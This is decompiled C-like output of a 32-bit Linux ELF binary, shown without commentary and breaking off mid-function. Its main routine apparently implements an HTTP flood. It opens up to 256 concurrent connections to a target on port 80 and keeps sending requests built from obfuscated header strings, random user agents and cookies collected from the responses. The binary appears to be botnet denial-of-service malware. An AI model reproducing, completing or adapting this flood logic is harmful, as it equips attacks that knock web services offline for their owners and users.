typedef unsigned char   undefined;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    word;
typedef struct Elf32_Shdr Elf32_Shdr, *PElf32_Shdr;

typedef enum Elf_SectionHeaderType_x86 {
    SHT_NULL=0,
    SHT_PROGBITS=1,
    SHT_SYMTAB=2,
    SHT_STRTAB=3,
    SHT_RELA=4,
    SHT_HASH=5,
    SHT_DYNAMIC=6,
    SHT_NOTE=7,
    SHT_NOBITS=8,
    SHT_REL=9,
    SHT_SHLIB=10,
    SHT_DYNSYM=11,
    SHT_INIT_ARRAY=14,
    SHT_FINI_ARRAY=15,
    SHT_PREINIT_ARRAY=16,
    SHT_GROUP=17,
    SHT_SYMTAB_SHNDX=18,
    SHT_ANDROID_REL=1610612737,
    SHT_ANDROID_RELA=1610612738,
    SHT_GNU_ATTRIBUTES=1879048181,
    SHT_GNU_HASH=1879048182,
    SHT_GNU_LIBLIST=1879048183,
    SHT_CHECKSUM=1879048184,
    SHT_SUNW_move=1879048186,
    SHT_SUNW_COMDAT=1879048187,
    SHT_SUNW_syminfo=1879048188,
    SHT_GNU_verdef=1879048189,
    SHT_GNU_verneed=1879048190,
    SHT_GNU_versym=1879048191
} Elf_SectionHeaderType_x86;

struct Elf32_Shdr {
    dword sh_name;
    enum Elf_SectionHeaderType_x86 sh_type;
    dword sh_flags;
    dword sh_addr;
    dword sh_offset;
    dword sh_size;
    dword sh_link;
    dword sh_info;
    dword sh_addralign;
    dword sh_entsize;
};

typedef struct Elf32_Phdr Elf32_Phdr, *PElf32_Phdr;

typedef enum Elf_ProgramHeaderType_x86 {
    PT_NULL=0,
    PT_LOAD=1,
    PT_DYNAMIC=2,
    PT_INTERP=3,
    PT_NOTE=4,
    PT_SHLIB=5,
    PT_PHDR=6,
    PT_TLS=7,
    PT_GNU_EH_FRAME=1685382480,
    PT_GNU_STACK=1685382481,
    PT_GNU_RELRO=1685382482
} Elf_ProgramHeaderType_x86;

struct Elf32_Phdr {
    enum Elf_ProgramHeaderType_x86 p_type;
    dword p_offset;
    dword p_vaddr;
    dword p_paddr;
    dword p_filesz;
    dword p_memsz;
    dword p_flags;
    dword p_align;
};

typedef struct Elf32_Ehdr Elf32_Ehdr, *PElf32_Ehdr;

struct Elf32_Ehdr {
    byte e_ident_magic_num;
    char e_ident_magic_str[3];
    byte e_ident_class;
    byte e_ident_data;
    byte e_ident_version;
    byte e_ident_osabi;
    byte e_ident_abiversion;
    byte e_ident_pad[7];
    word e_type;
    word e_machine;
    dword e_version;
    dword e_entry;
    dword e_phoff;
    dword e_shoff;
    dword e_flags;
    word e_ehsize;
    word e_phentsize;
    word e_phnum;
    word e_shentsize;
    word e_shnum;
    word e_shstrndx;
};




void FUN_08048094(void)

{
  FUN_08048100();
  FUN_08054660();
  return;
}



// WARNING: Removing unreachable block (ram,0x080480df)

void FUN_080480b0(void)

{
  code *pcVar1;
  
  if (DAT_080550a0 == '\0') {
    while (pcVar1 = *(code **)PTR_DAT_0805506c, pcVar1 != (code *)0x0) {
      PTR_DAT_0805506c = PTR_DAT_0805506c + 4;
      (*pcVar1)();
    }
    DAT_080550a0 = '\x01';
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0804811b)
// WARNING: Removing unreachable block (ram,0x08048142)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_08048100(void)

{
  return;
}



void processEntry entry(undefined4 param_1,uint param_2)

{
  undefined4 *puVar1;
  undefined *puVar2;
  code *pcVar3;
  char cVar4;
  undefined2 uVar5;
  undefined2 uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  undefined4 *puVar12;
  undefined4 uVar13;
  int iVar14;
  uint uVar15;
  uint *puVar16;
  int *piVar17;
  undefined4 *puVar18;
  int *piVar19;
  int *piVar20;
  undefined4 uVar21;
  byte bVar22;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  int *piVar23;
  int *piVar24;
  char *pcVar25;
  int *piVar26;
  char *pcVar27;
  uint uVar28;
  int *piVar29;
  char *pcVar30;
  int *piVar31;
  undefined8 uVar32;
  int local_51b4;
  int local_519c;
  int local_5190;
  char *local_518c;
  int local_5188;
  char cStack_517a;
  undefined4 local_5179;
  char acStack_5175 [10237];
  undefined local_2978 [10240];
  uint local_178 [32];
  uint local_f8 [32];
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  uint local_5c;
  int *local_58;
  undefined local_54 [16];
  undefined4 uStack_44;
  code *pcStack_40;
  uint local_3c;
  undefined *local_38;
  code *local_34;
  code *local_30;
  undefined4 uStack_2c;
  undefined4 uStack_14;
  
  uStack_14 = 0x804816f;
  uStack_2c = 0;
  local_30 = FUN_08054687;
  local_34 = FUN_08048094;
  local_38 = &stack0x00000004;
  local_3c = param_2;
  pcStack_40 = FUN_0804e8e0;
  uStack_44 = 0x8048192;
  FUN_08050bbe();
  pcVar3 = local_30;
  uStack_44 = 0;
  uVar15 = (uint)local_34 & 0xff;
  uVar28 = local_3c & 0xff;
  iVar7 = FUN_08049ef0(uVar15,local_30,0x15,0);
  iVar8 = FUN_08049ef0(uVar15,pcVar3,0x14,&DAT_080546d4);
  iVar9 = FUN_08049ef0(uVar15,pcVar3,8,0);
  iVar10 = FUN_08049ef0(uVar15,pcVar3,0x16,&DAT_080546ad);
  local_5188 = FUN_0804a420(uVar15,pcVar3,0x18,1);
  uVar5 = FUN_0804a420(uVar15,pcVar3,7,0x50);
  FUN_08052dbc(&cStack_517a + 1,0,0x2801);
  if ((((iVar9 == 0) || (iVar10 == 0)) || (iVar11 = FUN_08050620(iVar10), 0xff < iVar11)) ||
     ((iVar11 = FUN_08050620(iVar9), 0x7f < iVar11 || (iVar11 = FUN_08050620(iVar8), 9 < iVar11))))
  {
    return;
  }
  local_58 = (int *)0x0;
  while (iVar11 = FUN_08050620(iVar8), (int)local_58 < iVar11) {
    cVar4 = *(char *)(iVar8 + (int)local_58);
    if ((byte)(cVar4 + 0x9fU) < 0x1a) {
      *(char *)(iVar8 + (int)local_58) = cVar4 + -0x20;
    }
    local_58 = (int *)((int)local_58 + 1);
  }
  if (0x100 < local_5188) {
    local_5188 = 0x100;
  }
  FUN_0804fcd0(0x24);
  FUN_0804fcd0(0x25);
  FUN_0804fcd0(0x26);
  FUN_0804fcd0(0x27);
  FUN_0804fcd0(0x28);
  FUN_0804fcd0(0x29);
  FUN_0804fcd0(0x2a);
  FUN_0804fcd0(0x2b);
  FUN_0804fcd0(0x2c);
  FUN_0804fcd0(0x2d);
  FUN_0804fcd0(0x2e);
  puVar12 = (undefined4 *)FUN_08051070(local_5188,0xc44);
  if (0 < local_5188) {
    local_51b4 = 0;
    uVar13 = extraout_ECX;
    puVar18 = puVar12;
    do {
      puVar2 = local_38;
      *(undefined *)(puVar18 + 1) = 0;
      *puVar18 = 0xffffffff;
      iVar11 = local_51b4 % (int)uVar28;
      puVar1 = puVar18 + 0x85;
      puVar18[4] = *(undefined4 *)(local_38 + iVar11 * 0x18 + 0x10);
      uVar13 = FUN_08050640(puVar1,iVar10,uVar13,uVar13);
      if (*(char *)(puVar18 + 0x85) != '/') {
        uVar13 = FUN_08050620(puVar1);
        uVar13 = FUN_08052d88((int)puVar18 + 0x215,puVar1,uVar13);
        *(undefined *)(puVar18 + 0x85) = 0x2f;
      }
      FUN_08050640(puVar18 + 0x168,iVar8,uVar13,uVar13);
      FUN_08050640((int)puVar18 + 0x597,iVar8);
      FUN_08050640((int)puVar18 + 0x315,iVar9);
      if ((byte)puVar2[iVar11 * 0x18 + 0x14] < 0x20) {
        iVar14 = FUN_080526b8(*(undefined4 *)(puVar2 + iVar11 * 0x18 + 0x10));
        uVar15 = FUN_0804f450();
        uVar13 = FUN_08052518((uVar15 >> (puVar2[iVar11 * 0x18 + 0x14] & 0x1f)) + iVar14);
        puVar18[4] = uVar13;
      }
      uVar15 = FUN_0804f450();
      uVar15 = uVar15 % 5;
      switch(uVar15) {
      case 0:
        FUN_0804fcd0(0x2f);
        uVar13 = FUN_0804fc20(0x2f,0);
        FUN_08050640(puVar18 + 5,uVar13);
        uVar15 = FUN_0804fc50(0x2f);
        break;
      case 1:
        FUN_0804fcd0(0x30);
        uVar13 = FUN_0804fc20(0x30,0);
        FUN_08050640(puVar18 + 5,uVar13);
        uVar15 = FUN_0804fc50(0x30);
        break;
      case 2:
        FUN_0804fcd0(0x31);
        uVar13 = FUN_0804fc20(0x31,0);
        FUN_08050640(puVar18 + 5,uVar13);
        uVar15 = FUN_0804fc50(0x31);
        break;
      case 3:
        FUN_0804fcd0(0x32);
        uVar13 = FUN_0804fc20(0x32,0);
        FUN_08050640(puVar18 + 5,uVar13);
        uVar15 = FUN_0804fc50(0x32);
        break;
      case 4:
        FUN_0804fcd0(0x33);
        uVar13 = FUN_0804fc20(0x33,0);
        FUN_08050640(puVar18 + 5,uVar13);
        uVar15 = FUN_0804fc50(0x33);
      }
      puVar18 = puVar18 + 0x311;
      FUN_08050640(puVar1,iVar10,uVar15,uVar15);
      local_51b4 = local_51b4 + 1;
      uVar13 = extraout_ECX_00;
    } while (local_51b4 != local_5188);
  }
LAB_08048564:
  do {
    do {
      do {
        iVar8 = FUN_080530dc(0);
        puVar16 = local_f8;
        do {
          *puVar16 = 0;
          puVar16 = puVar16 + 1;
        } while (puVar16 != &local_78);
        puVar16 = local_178;
        do {
          *puVar16 = 0;
          puVar16 = puVar16 + 1;
        } while (puVar16 != local_f8);
      } while (local_5188 < 1);
      local_519c = 0;
      uVar15 = extraout_ECX_01;
      iVar9 = 0;
      puVar18 = puVar12 + 4;
      do {
        while (iVar10 = iVar9, cVar4 = *(char *)(puVar18 + -3), cVar4 != '\x01') {
          if (cVar4 == '\0') goto LAB_08048623;
          if (cVar4 == '\x02') {
            if ((uint)(iVar8 - puVar18[-2]) < 0x1f) {
              uVar28 = puVar18[-4];
              uVar15 = uVar28 & 0x1f;
              local_178[uVar28 >> 5] = local_178[uVar28 >> 5] | 1 << (sbyte)uVar15;
              goto joined_r0x08048ebc;
            }
          }
          else {
            if (cVar4 == '\x04') goto LAB_080488aa;
            if (((cVar4 == '\x06') || (cVar4 == '\a')) || (cVar4 == '\n')) {
              uVar28 = puVar18[-4];
              uVar15 = local_f8[uVar28 >> 5] | 1 << ((byte)uVar28 & 0x1f);
              local_f8[uVar28 >> 5] = uVar15;
              goto joined_r0x08048e77;
            }
          }
          *(undefined *)(puVar18 + -3) = 0;
          FUN_08053125(puVar18[-4]);
          puVar18[-4] = 0xffffffff;
          uVar15 = extraout_ECX_02;
LAB_08048600:
          puVar18 = puVar18 + 0x311;
          iVar9 = iVar10 + 1;
          if (iVar10 + 1 == local_5188) goto LAB_0804874e;
        }
        if (puVar18[0x168] == 0) {
          *(undefined *)(puVar18 + -3) = 0;
LAB_08048623:
          local_78 = 0;
          local_74 = 0;
          local_70 = 0;
          local_6c = 0;
          if (puVar18[-4] != -1) {
            FUN_08053125(puVar18[-4]);
            uVar15 = extraout_ECX_03;
          }
          uVar32 = FUN_08052834(2,1,0,uVar15);
          iVar9 = (int)uVar32;
          puVar18[-4] = iVar9;
          uVar15 = extraout_ECX_04;
          if (iVar9 != -1) {
            uVar15 = FUN_08050d80(iVar9,3,0,(int)((ulonglong)uVar32 >> 0x20));
            FUN_08050d80(puVar18[-4],4,uVar15 | 0x800);
            local_58 = (int *)0xffff;
            FUN_080527e0(puVar18[-4],0,8,&local_58,4);
            local_74 = *puVar18;
            local_78 = CONCAT22(local_78._2_2_,2);
            uVar6 = FUN_08052544(uVar5);
            local_78 = CONCAT22(uVar6,(undefined2)local_78);
            puVar18[-2] = iVar8;
            *(undefined *)(puVar18 + -3) = 2;
            FUN_08052418(puVar18[-4],&local_78,0x10);
            uVar28 = puVar18[-4];
            uVar15 = local_178[uVar28 >> 5] | 1 << ((byte)uVar28 & 0x1f);
            local_178[uVar28 >> 5] = uVar15;
joined_r0x08048ebc:
            if (local_519c < (int)uVar28) goto LAB_08048738;
          }
          goto LAB_08048600;
        }
        *(undefined *)(puVar18 + -3) = 4;
LAB_080488aa:
        puVar18[0x16a] = 0xffffffff;
        puVar18[0x167] = 0;
        FUN_080506b0(puVar18 + 0x20d,0x400,uVar15,uVar15);
        puVar18[0x20c] = 0;
        FUN_080506b0(local_2978,0x2800);
        iVar9 = (int)puVar18 + 0x587;
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,iVar9);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11," ");
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,puVar18 + 0x81);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11," HTTP/1.1\r\nUser-Agent: ");
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,puVar18 + 1);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,"\r\nHost: ");
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,(int)puVar18 + 0x305);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        FUN_0804fcd0(0x20);
        uVar13 = FUN_0804fc20(0x20,0);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,uVar13);
        FUN_0804fc50(0x20);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        FUN_0804fcd0(0x21);
        uVar13 = FUN_0804fc20(0x21,0);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,uVar13);
        FUN_0804fc50(0x21);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        FUN_0804fcd0(0x22);
        uVar13 = FUN_0804fc20(0x22,0);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,uVar13);
        FUN_0804fc50(0x22);
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        if (iVar7 != 0) {
          FUN_0804fcd0(0x23);
          uVar13 = FUN_0804fc20(0x23,0);
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,uVar13);
          FUN_0804fc50(0x23);
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
          uVar13 = FUN_0804fc20(0x28,0);
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,uVar13);
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11," ");
          iVar11 = FUN_08050620(local_2978);
          uVar13 = FUN_08050620(iVar7);
          FUN_08050a20(uVar13,10,local_2978 + iVar11);
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        }
        if (0 < (int)puVar18[0x16b]) {
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,"Cookie: ");
          local_58 = (int *)0x0;
          if (0 < (int)puVar18[0x16b]) {
            do {
              piVar29 = local_58;
              iVar11 = FUN_08050620(local_2978);
              FUN_08050640(local_2978 + iVar11,puVar18 + (int)piVar29 * 0x20 + 0x16c);
              iVar11 = FUN_08050620(local_2978);
              FUN_08050640(local_2978 + iVar11,&DAT_080546e1);
              local_58 = (int *)((int)local_58 + 1);
            } while ((int)local_58 < (int)puVar18[0x16b]);
          }
          iVar11 = FUN_08050620(local_2978);
          FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        }
        iVar11 = FUN_08050620(local_2978);
        FUN_08050640(local_2978 + iVar11,&DAT_080546e6);
        iVar11 = iVar7;
        if (iVar7 != 0) {
          iVar11 = FUN_08050620(local_2978);
          iVar11 = FUN_08050640(local_2978 + iVar11,iVar7);
        }
        uVar13 = FUN_08050980(iVar9,puVar18 + 0x164,iVar11,iVar11);
        if ((char)uVar13 == '\0') {
          FUN_08050640(iVar9,puVar18 + 0x164,uVar13,uVar13);
        }
        uVar13 = FUN_08050620(local_2978);
        FUN_08052768(puVar18[-4],local_2978,uVar13,0x4000);
        uVar28 = puVar18[-4];
        *(undefined *)(puVar18 + -3) = 6;
        uVar15 = uVar28 & 0x1f;
        puVar18[-1] = iVar8;
        local_f8[uVar28 >> 5] = local_f8[uVar28 >> 5] | 1 << (sbyte)uVar15;
joined_r0x08048e77:
        if ((int)uVar28 <= local_519c) goto LAB_08048600;
LAB_08048738:
        local_519c = uVar28 + 1;
        puVar18 = puVar18 + 0x311;
        iVar9 = iVar10 + 1;
      } while (iVar10 + 1 != local_5188);
LAB_0804874e:
      piVar29 = (int *)(iVar10 + 1);
    } while (local_519c == 0);
    local_64 = 0;
    local_68 = 1;
    iVar8 = FUN_080529e0(local_519c,local_f8,local_178,0,&local_68);
    piVar17 = (int *)FUN_080530dc(0);
  } while (iVar8 < 1);
  local_5190 = 0;
  piVar31 = puVar12 + 0x16b;
LAB_0804880d:
  piVar19 = piVar31 + -0x16b;
  uVar15 = piVar31[-0x16b];
  if (uVar15 != 0xffffffff) {
    uVar28 = uVar15 >> 5;
    bVar22 = (byte)uVar15 & 0x1f;
    if ((local_178[uVar28] >> bVar22 & 1) != 0) {
      local_5c = 0;
      local_60 = 4;
      uVar15 = FUN_080524c4(uVar15,1,4,&local_5c,&local_60);
      if ((uVar15 | local_5c) == 0) {
        *(undefined *)(piVar31 + -0x16a) = 4;
        uVar28 = (uint)piVar31[-0x16b] >> 5;
        bVar22 = (byte)piVar31[-0x16b] & 0x1f;
        goto LAB_080487c0;
      }
LAB_08048f58:
      FUN_08053125(piVar31[-0x16b]);
      piVar31[-0x16b] = -1;
      *(undefined *)(piVar31 + -0x16a) = 0;
      goto LAB_080487f0;
    }
LAB_080487c0:
    if ((local_f8[uVar28] >> bVar22 & 1) == 0) goto LAB_080487f0;
    cVar4 = *(char *)(piVar31 + -0x16a);
    if (cVar4 == '\x06') {
      FUN_080506b0(&cStack_517a + 1,0x2800,piVar29,piVar29);
      piVar19 = (int *)FUN_080526f0(piVar31[-0x16b],&cStack_517a + 1,0x2800,0x4002);
      if ((int)piVar19 < 1) goto LAB_08048f58;
      iVar8 = FUN_080506d0(&cStack_517a + 1,piVar19,&DAT_080546e4,4);
      if ((iVar8 != -1) || (0x27ff < (int)piVar19)) {
        iVar8 = FUN_080506d0(&cStack_517a + 1,piVar19,&DAT_080546e4,4);
        (&cStack_517a)[iVar8 + 1] = '\0';
        uVar13 = FUN_0804fc20(0x2e,0);
        iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 != -1) {
          *piVar31 = 2;
        }
        uVar13 = FUN_0804fc20(0x2d,0,piVar29,piVar29);
        iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 != -1) {
          *piVar31 = 1;
        }
        piVar31[1] = 0;
        uVar13 = FUN_0804fc20(0x2c,0,piVar19,piVar19);
        uVar32 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
        uVar13 = (undefined4)((ulonglong)uVar32 >> 0x20);
        iVar8 = (int)uVar32 + 1;
        piVar24 = piVar19;
        if (iVar8 != 0) {
          uVar13 = FUN_0804fc20(0x2c,0,uVar13,uVar13);
          iVar9 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
          iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
          piVar24 = (int *)(&cStack_517a + iVar9 + 1);
          iVar8 = FUN_080506d0(piVar24,(int)piVar19 - iVar9,&DAT_080546e6,2);
          if (iVar8 != -1) {
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            puVar2 = local_54 + iVar8;
            puVar2[iVar9 + -0x5125] = 0;
            uVar13 = FUN_0804fc20(0x2b,0,puVar2,puVar2);
            uVar21 = FUN_08050620(piVar24);
            iVar8 = FUN_08050900(piVar24,uVar21,uVar13);
            if (iVar8 != 0) {
              piVar31[1] = 1;
            }
          }
        }
        piVar31[2] = 0;
        uVar13 = FUN_0804fc20(0x29,0,iVar8,iVar8);
        iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
        iVar8 = iVar8 + 1;
        if (iVar8 != 0) {
          uVar13 = FUN_0804fc20(0x29,0,iVar8,iVar8);
          iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
          iVar8 = iVar8 + (uint)((&cStack_517a)[iVar8 + 1] == ' ');
          piVar24 = (int *)(&cStack_517a + iVar8 + 1);
          iVar9 = FUN_080506d0(piVar24,(int)piVar19 - iVar8,&DAT_080546e6,2);
          if (iVar9 != -1) {
            if (1 < iVar9) {
              iVar9 = iVar9 + -2;
            }
            (&cStack_517a)[iVar8 + iVar9 + 1] = '\0';
            uVar13 = FUN_0804fc20(0x2a,0,piVar29,piVar29);
            uVar21 = FUN_08050620(piVar24);
            iVar8 = FUN_08050900(piVar24,uVar21,uVar13);
            if (iVar8 != 0) {
              piVar31[2] = 1;
            }
          }
        }
        uVar13 = FUN_0804fc20(0x28,0,piVar24,piVar24);
        iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 == -1) {
          piVar31[3] = 0;
          iVar8 = 0;
        }
        else {
          uVar13 = FUN_0804fc20(0x28,0,extraout_ECX_07,extraout_ECX_07);
          iVar9 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
          iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
          iVar8 = FUN_080506d0(&cStack_517a + iVar9 + 1,(int)piVar19 - iVar9,&DAT_080546e6,2);
          if (iVar8 != -1) {
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            puVar2 = local_54 + iVar8;
            puVar2[iVar9 + -0x5125] = 0;
            iVar8 = FUN_08050720(&cStack_517a + iVar9 + 1,10,puVar2,puVar2);
            piVar31[3] = iVar8;
          }
        }
        pcVar25 = (char *)0x0;
LAB_08049494:
        do {
          uVar13 = FUN_0804fc20(0x27,0,iVar8,iVar8);
          pcVar27 = &cStack_517a + 1 + (int)pcVar25;
          iVar8 = FUN_08050900(pcVar27,piVar19,uVar13);
          iVar8 = iVar8 + 1;
          if ((iVar8 == 0) || (4 < piVar31[4])) goto LAB_08049659;
          uVar13 = FUN_0804fc20(0x27,0,iVar8,iVar8);
          iVar8 = FUN_08050900(pcVar27,piVar19,uVar13);
          local_518c = pcVar25 + iVar8;
          if ((&cStack_517a + 1)[(int)local_518c] == ' ') {
            iVar8 = iVar8 + 1;
            local_518c = pcVar25 + iVar8;
          }
          pcVar27 = pcVar27 + iVar8;
          piVar29 = (int *)((int)piVar19 + (-iVar8 - (int)pcVar25));
          iVar8 = FUN_080506d0(pcVar27,piVar29,&DAT_080546e6,2);
          pcVar25 = local_518c;
          if (iVar8 != -1) {
            pcVar30 = &cStack_517a + 1 + (int)local_518c;
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            iVar9 = FUN_080506d0(pcVar27,piVar29,&DAT_080546e9,1);
            if (0 < iVar9) {
              iVar8 = FUN_080506d0(pcVar27,piVar29,&DAT_080546e9,1);
              iVar8 = iVar8 + -1;
            }
            local_58 = (int *)0x0;
            (&cStack_517a + 1 + (int)local_518c)[iVar8] = '\0';
            while (iVar8 = FUN_08050620(pcVar30), piVar24 = local_58, (int)local_58 < iVar8) {
              if (pcVar30[(int)local_58] == '=') goto LAB_080495c6;
              local_58 = (int *)((int)local_58 + 1);
            }
            if (pcVar30[(int)local_58] == '=') {
LAB_080495c6:
              local_58 = (int *)0x0;
              if (0 < piVar31[4]) {
                do {
                  iVar8 = FUN_080509d0(pcVar30,piVar31 + (int)local_58 * 0x20 + 5,piVar24,piVar29);
                  if ((char)iVar8 != '\0') goto LAB_08049494;
                  local_58 = (int *)((int)local_58 + 1);
                } while ((int)local_58 < piVar31[4]);
              }
              iVar8 = FUN_08050620(pcVar30);
              if (iVar8 < 0x80) {
                iVar8 = FUN_08050640(piVar31 + piVar31[4] * 0x20 + 5,pcVar30,extraout_ECX_08,
                                     extraout_ECX_08);
                piVar31[4] = piVar31[4] + 1;
              }
            }
          }
        } while( true );
      }
      goto LAB_080487f0;
    }
    if (cVar4 == '\a') {
      piVar29 = piVar31 + 0xb6;
      piVar24 = piVar31 + 0xa6;
      iVar8 = piVar31[0xa5];
      piVar20 = piVar19;
      while( true ) {
        if (iVar8 == 0x400) {
          FUN_08052d88(piVar24,piVar29,0x3c0,piVar20);
          piVar31[0xa5] = piVar31[0xa5] + -0x40;
        }
        puVar18 = (undefined4 *)FUN_08050d40();
        *puVar18 = 0;
        iVar8 = FUN_080526f0(piVar31[-0x16b],(int)piVar24 + piVar31[0xa5],0x400 - piVar31[0xa5],
                             0x4000);
        if (iVar8 == 0) break;
        if (iVar8 == -1) goto LAB_08048f3c;
        piVar31[0xa5] = piVar31[0xa5] + iVar8;
        piVar31[-0x169] = (int)piVar17;
        piVar23 = piVar17;
        do {
          piVar20 = (int *)piVar31[3];
          if ((int)piVar20 < 1) {
            piVar26 = (int *)0x0;
          }
          else {
            piVar26 = (int *)piVar31[0xa5];
            if ((int)piVar20 < (int)(int *)piVar31[0xa5]) {
              piVar26 = piVar20;
            }
            piVar20 = (int *)((int)piVar20 - (int)piVar26);
            piVar31[3] = (int)piVar20;
            if (*piVar31 == 1) {
              uVar13 = FUN_0804fc20(0x24,0,piVar20,piVar20);
              uVar32 = FUN_080506d0(piVar24,piVar31[0xa5],uVar13,0xb);
              piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
              if ((int)uVar32 != -1) {
                uVar13 = FUN_0804fc20(0x24,0,piVar29,piVar29);
                iVar8 = FUN_080506d0(piVar24,piVar31[0xa5],uVar13,0xb);
                piVar29 = (int *)((int)piVar24 + iVar8);
                iVar9 = FUN_080506d0(piVar29,piVar31[0xa5] - iVar8,&DAT_080546fa,1);
                *(undefined *)((int)piVar31 + iVar9 + iVar8 + 0x297) = 0;
                if ((piVar31[4] < 5) && (iVar10 = FUN_08050620(piVar29), iVar10 < 0x80)) {
                  FUN_08050640(piVar31 + piVar31[4] * 0x20 + 5,piVar29,extraout_ECX_10,
                               extraout_ECX_10);
                  iVar10 = piVar31[4];
                  piVar29 = piVar31 + iVar10 * 0x20 + 5;
                  iVar11 = FUN_08050620();
                  FUN_08050640((int)(piVar31 + iVar10 * 0x20 + 5) + iVar11,&DAT_080546f3);
                  iVar10 = iVar9 + iVar8 + 3;
                  iVar8 = FUN_080506d0((int)piVar24 + iVar10,piVar31[0xa5] - iVar10,&DAT_080546fa,1)
                  ;
                  *(undefined *)((int)piVar31 + iVar10 + iVar8 + 0x297) = 0;
                  iVar8 = piVar31[4];
                  iVar9 = FUN_08050620(piVar31 + iVar8 * 0x20 + 5);
                  FUN_08050640((int)(piVar31 + iVar8 * 0x20 + 5) + iVar9,(int)piVar24 + iVar10);
                  piVar31[4] = piVar31[4] + 1;
                }
                piVar31[3] = -1;
                *(undefined *)(piVar31 + -0x16a) = 10;
                goto LAB_080487f0;
              }
              piVar20 = (int *)piVar31[3];
            }
          }
          if (piVar20 == (int *)0x0) {
            if (piVar31[2] == 1) {
              uVar32 = FUN_080506d0(piVar24,piVar31[0xa5],&DAT_080546e6,2);
              piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
              piVar20 = (int *)((int)uVar32 + 1);
              if (piVar20 != (int *)0x0) {
                piVar26 = (int *)FUN_080506d0(piVar24,piVar31[0xa5],&DAT_080546e6,2);
                *(undefined *)((int)piVar26 + 0x842 + (int)piVar19) = 0;
                iVar8 = FUN_080506d0(piVar24,piVar26,&DAT_080546e9,1);
                uVar13 = extraout_ECX_05;
                if (iVar8 != -1) {
                  iVar8 = FUN_080506d0(piVar24,piVar26,&DAT_080546e9,1);
                  *(undefined *)((int)piVar31 + iVar8 + 0x298) = 0;
                  uVar13 = extraout_ECX_06;
                }
                uVar32 = FUN_08050720(piVar24,0x10,uVar13,uVar13);
                piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
                if ((int)uVar32 == 0) goto LAB_08048f25;
                piVar20 = (int *)((int)uVar32 + 2);
                piVar31[3] = (int)piVar20;
              }
            }
            else {
              piVar20 = (int *)(piVar31[0xa5] - (int)piVar26);
              piVar31[3] = (int)piVar20;
              if (piVar20 == (int *)0x0) goto LAB_08048f25;
            }
          }
          if (piVar26 == (int *)0x0) break;
          iVar8 = piVar31[0xa5];
          piVar31[0xa5] = iVar8 - (int)piVar26;
          FUN_08052d88(piVar24,(int)piVar24 + (int)piVar26,iVar8 - (int)piVar26,piVar23);
          piVar20 = (int *)piVar31[0xa5];
          *(undefined *)((int)(piVar31 + 0xa6) + (int)piVar20) = 0;
          piVar23 = piVar19;
        } while (piVar20 != (int *)0x0);
        if (*(char *)(piVar31 + -0x16a) != '\a') goto LAB_080487f0;
        iVar8 = piVar31[0xa5];
      }
      puVar18 = (undefined4 *)FUN_08050d40();
      *puVar18 = 0x68;
LAB_08048f3c:
      piVar19 = (int *)FUN_08050d40();
      if ((*piVar19 != 0xb) && (piVar19 = (int *)FUN_08050d40(), *piVar19 != 0xb))
      goto LAB_08048f58;
      goto LAB_080487f0;
